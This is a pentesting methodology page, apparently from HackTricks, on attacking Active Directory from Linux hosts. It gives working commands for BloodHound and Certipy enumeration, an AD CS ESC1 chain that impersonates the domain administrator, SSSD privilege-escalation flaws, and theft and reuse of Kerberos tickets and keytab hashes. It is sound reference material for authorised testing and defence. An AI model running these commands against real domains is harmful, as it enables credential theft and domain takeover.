# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

A linux machine can also be present inside an Active Directory environment.

A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.

## Enumeration

### AD enumeration from linux

If you have access over an AD in linux (or bash in Windows) you can try [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) to enumerate the AD.

You can also check the following page to learn **other ways to enumerate AD from linux**:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

---

### Modern cross-platform ingestors

The classical Windows‐only **SharpHound** collector has several mature, actively-maintained Linux alternatives that can be executed directly from a shell on a domain-joined host or from an out-of-domain attacker box:

* **BloodHound.py** – pure-Python BloodHound ingestor that relies only on Impacket. It supports the newest Neo4j/GraphQL based Community-Edition schema and can run entirely from Linux with a command such as:

  ```bash
  python3 -m pip install bloodhound # or git clone https://github.com/dirkjanm/BloodHound.py
  bloodhound-python -u alice -p "P@ssw0rd" -d HACKTRICKS.LOCAL -gc HACKTRICKS.LOCAL \
                    -ns 10.10.10.1 -dns 10.10.10.1 -c All,ACL --zip
  # Upload the ZIP file to the BloodHound UI (or use `--upload` when reachable)
  ```

* **Certipy** ≥ 4.0 – besides abusing AD CS (see next section) it contains an *`find`* and *`graph`* module that quickly identifies vulnerable certificate templates and privileges from Linux. Example enumeration:

  ```bash
  certipy  -u alice -p "P@ssw0rd" -domain hacktricks.local -target dc.hacktricks.local find
  ```

These tools generate JSON/ZIP data compatible with BloodHound Community-Edition (Neo4j or SQLite back-end) and therefore allow full path-finding without ever touching a Windows binary.  
For enterprise environments that block unsigned executables on workstations, being able to collect data from a privileged Linux host (jump-box, container, WSL, …) is extremely convenient.


### FreeIPA

FreeIPA is an open-source **alternative** to Microsoft Windows **Active Directory**, mainly for **Unix** environments. It combines a complete **LDAP directory** with an MIT **Kerberos** Key Distribution Center for management akin to Active Directory. Utilizing the Dogtag **Certificate System** for CA & RA certificate management, it supports **multi-factor** authentication, including smartcards. SSSD is integrated for Unix authentication processes. Learn more about it in:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Abusing Active Directory Certificate Services (AD CS) from Linux

Microsoft’s certificate infrastructure is nowadays one of the fastest ways to obtain **Domain Admin** from a low-privileged account.  
`Certipy` implements (and frequently updates) the research from Will Schroeder & Lee Christensen directly in Python, so everything can be performed from Linux:

```bash
# enumerate vulnerable templates and misconfigurations
certipy find -u user -p 'Spring2025!' -domain hacktricks.local -target dc.hacktricks.local

# request a certificate for ESC1 template and export as PFX
certipy req  -u user@hacktricks.local -p 'Spring2025!' -ca hacktricks-CA \
            -template ESC1 -upn 'administrator@hacktricks.local' -tcp 445

# use the certificate to obtain a TGT and perform PTT
certipy auth -pfx user_ESC1.pfx
export KRB5CCNAME=administrator.ccache
impacket-wmiexec administrator@hacktricks.local -k -no-pass 'whoami'
```

If `ESC1/ESC2/ESC3` misconfigurations are not present, `Certipy exploit` automates *NTLM relay* to the *ADCS HTTP enrolment endpoints* (❰/certsrv❱) from Linux, providing an end-to-end path similar to **PetitPotam ➜ ntlmrelayx ➜ adcs** but without requiring any Windows hosts.

For detailed theory check:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/README.md
{{#endref}}

## Recent SSSD privilege-separation vulnerabilities (2024)

In December 2024 the SUSE Security Team published a deep dive on **SSSD 2.10 privilege separation**, uncovering several weaknesses that allowed a local *`sssd`* user (or an attacker who compromised that account) to:

* load **arbitrary shared objects** through the `LDB_MODULES_PATH` environment variable in *`sssd_pam`*, effectively executing code as **root**.
* perform **symlink attacks** against `/var/lib/sssd` and `/var/log/sssd` during `systemctl restart sssd` because the service unit executes recursive `chown/chmod` operations as root without `--no-dereference`.

Distributions that package SSSD with privilege separation (Arch, upcoming Fedora, some enterprise distros) were affected.  
Upstream released **SSSD 2.10.1** and hardened the unit file, but many servers in the wild remain un-patched.

☑️ If you find a Linux host joined to AD, always verify the installed SSSD version and service file permissions – exploiting these issues may yield instant root **and** access to the local *KCM* database containing Kerberos tickets.

---

## Playing with tickets

### Pass The Ticket

In this page you are going to find different places were you could **find kerberos tickets inside a linux host**, in the following page you can learn how to transform this CCache tickets formats to Kirbi (the format you need to use in Windows) and also how to perform a PTT attack:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files are binary formats for **storing Kerberos credentials** are typically stored with 600 permissions in `/tmp`. These files can be identified by their **name format, `krb5cc_%{uid}`,** correlating to the user's UID. For authentication ticket verification, the **environment variable `KRB5CCNAME`** should be set to the path of the desired ticket file, enabling its reuse.

List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.

```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```

### CCACHE ticket reuse from keyring

**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

To configure and use this tool, the steps below are followed:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

This procedure will attempt to inject into various sessions, indicating success by storing extracted tickets in `/tmp` with a naming convention of `__krb_UID.ccache`.

### CCACHE ticket reuse from SSSD KCM

SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.

Invoking **`SSSDKCMExtractor`** with the --database and --key parameters will parse the database and **decrypt the secrets**.

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.

### CCACHE ticket reuse from keytab

```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

### Extract accounts from /etc/krb5.keytab

Service account keys, essential for services operating with root privileges, are securely stored in **`/etc/krb5.keytab`** files. These keys, akin to passwords for services, demand strict confidentiality.

To inspect the keytab file's contents, **`klist`** can be employed. The tool is designed to display key details, including the **NT Hash** for user authentication, particularly when the key type is identified as 23.

```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```

For Linux users, **`KeyTabExtract`** offers functionality to extract the RC4 HMAC hash, which can be leveraged for NTLM hash reuse.

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

On macOS, **`bifrost`** serves as a tool for keytab file analysis.

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizing the extracted account and hash information, connections to servers can be established using tools like **`crackmapexec`**.

```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
- [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [https://security.opensuse.org/2024/12/19/sssd-lacking-privilege-separation.html](https://security.opensuse.org/2024/12/19/sssd-lacking-privilege-separation.html)

{{#include ../../banners/hacktricks-training.md}}
